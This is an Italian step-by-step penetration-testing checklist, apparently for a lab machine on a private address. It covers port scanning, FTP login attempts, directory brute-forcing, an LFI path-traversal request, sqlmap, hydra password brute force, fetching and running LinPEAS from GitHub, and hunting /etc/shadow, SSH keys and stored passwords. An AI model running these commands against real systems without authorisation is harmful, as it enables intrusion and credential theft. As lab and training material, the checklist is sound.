# Fase 1: Scansione Completa dei Servizi
bash

## Scansione completa delle porte per vedere se ci sono altri servizi
sudo nmap -p- -sS -T4 -A 192.168.1.13

# Fase 2: Analisi del Servizio FTP (Porta 21)
bash

## 1. Prova accesso anonimo
ftp 192.168.1.13
    Username: anonymous
    Password: (vuoto)

non va

## 2. Se non funziona, prova con: ftp, user, test, admin
ftp 192.168.1.13
    Username: ftp
    Password: ftp

non va

## 3. Verifica versione vsftpd 3.0.3 (potrebbe avere vulnerabilità)
searchsploit vsftpd 3.0.3
### Cerca exploit per questa versione

## 4. Enumera con nmap script
nmap -p 21 --script=ftp-* 192.168.1.13

# Fase 3: Analisi del Servizio Web (Porta 80)
3.1 Esplorazione Base
bash

## 1. Vedi la pagina principale
curl http://192.168.1.13

## 2. Controlla header
curl -I http://192.168.1.13

## 3. Verifica robots.txt
curl http://192.168.1.13/robots.txt

## 4. Controlla directory comuni
curl http://192.168.1.13/admin/
curl http://192.168.1.13/phpmyadmin/
curl http://192.168.1.13/uploads/
curl http://192.168.1.13/backup/
curl http://192.168.1.13/wordpress/
curl http://192.168.1.13/.git/

3.2 Directory Brute Force
bash

## Usa gobuster per trovare directory nascoste
gobuster dir -u http://192.168.1.13 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,backup

## Usa dirb
dirb http://192.168.1.13 /usr/share/wordlists/dirb/common.txt

## Usa feroxbuster (più veloce)
feroxbuster -u http://192.168.1.13 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip

3.3 Controlla Vulnerabilità Web
bash

## Nikto scan
nikto -h http://192.168.1.13

## WPScan (se è WordPress)
wpscan --url http://192.168.1.13

## WhatWeb
whatweb http://192.168.1.13

Fase 4: Analisi Profonda FTP
4.1 Esplorazione FTP
bash

## Se l'accesso anonimo funziona, esplora
ftp 192.168.1.13
> ls -la
> cd / 
> ls -la
> get file_interessante.txt

## Prova a scaricare file di sistema se permesso
> get /etc/passwd
> get /etc/shadow

## Se puoi uploadare file
> put shell.php

4.2 FTP Anonymous con script NSE
bash

## Script per enumerazione FTP
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 192.168.1.13

Fase 5: Ricerca di Vulnerabilità Specifiche
5.1 Apache 2.4.18
bash

## Cerca vulnerabilità per Apache 2.4.18
searchsploit Apache 2.4.18

## Cerca exploit per questa versione
searchsploit -m apache 2.4.18

## Controlla CVE note
## - CVE-2016-5387 (HTTP_PROXY)
## - CVE-2017-9798 (Optionsbleed)
## - CVE-2017-15715 (File name bypass)

5.2 vsftpd 3.0.3
bash

## Cerca vulnerabilità per vsftpd 3.0.3
searchsploit vsftpd 3.0.3

## Questa versione potrebbe essere vulnerabile a:
## - CVE-2015-1419 (backdoor)
## - Denial of Service

# Fase 6: Accesso Iniziale
6.1 Se Web è vulnerabile
bash

## Prova LFI (Local File Inclusion)
curl http://192.168.1.13/index.php?page=../../../../etc/passwd

## Prova SQL Injection
## Usa sqlmap
sqlmap -u http://192.168.1.13 --dbs

## Se c'è file upload, carica webshell
## Se c'è directory con upload, verifica se esegue PHP

6.2 Se FTP ha credenziali deboli
bash

## Bruteforce su FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.13

## Oppure usando ncrack
ncrack -p 21 -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.13

# Fase 7: Privilege Escalation (Dopo Accesso)

Una volta ottenuto accesso shell:
bash

## 1. Identifica sistema
uname -a
cat /etc/os-release
cat /etc/issue

## 2. Controlla utenti
whoami
id
cat /etc/passwd | grep -v "nologin\|false"
cat /etc/shadow (se possibile)

## 3. Controlla sudo
sudo -l

## 4. Cerca file SUID
find / -perm -4000 -type f 2>/dev/null

## 5. Cerca file con capability
getcap -r / 2>/dev/null

## 6. Cron jobs
ls -la /etc/cron*
cat /etc/crontab

## 7. Cerca file di backup/configurazione
find / -name "*.conf" -type f 2>/dev/null | grep -v "snap\|proc"
find / -name "*.backup" -type f 2>/dev/null
find / -name "*.sql" -type f 2>/dev/null

## 8. Storia comandi
cat /home/*/.bash_history
cat /root/.bash_history (se possibile)

# Fase 8: Script Automatizzati per Privilege Escalation
bash

## Dopo aver ottenuto accesso, esegui:

## LinPEAS (copia sulla macchina target)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

## Linux Smart Enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh

## LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Fase 9: Cerca i "Segreti"
bash

## 1. File di configurazione web
cat /var/www/html/*.conf
cat /etc/apache2/apache2.conf
cat /var/www/html/config.php

## 2. Database
cat /var/www/html/wp-config.php  # Se WordPress
cat /var/www/html/.env

## 3. Chiavi SSH
find / -name "id_rsa" -type f 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null
find / -name "*.key" -type f 2>/dev/null

## 4. Password in file di testo
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "pass" /var/www/html/ 2>/dev/null
grep -r "admin" /var/www/html/ 2>/dev/null

# PROSSIMI PASSI:
Priorità 1: Esplora il sito web su porta 80
bash

curl http://192.168.1.13
## Cosa vedi? Potrebbe essere WordPress, un CMS, o una pagina custom

Priorità 2: Prova accesso FTP anonimo
bash

ftp 192.168.1.13
## Username: anonymous
## Password: (invio)

Priorità 3: Directory busting
bash

gobuster dir -u http://192.168.1.13 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt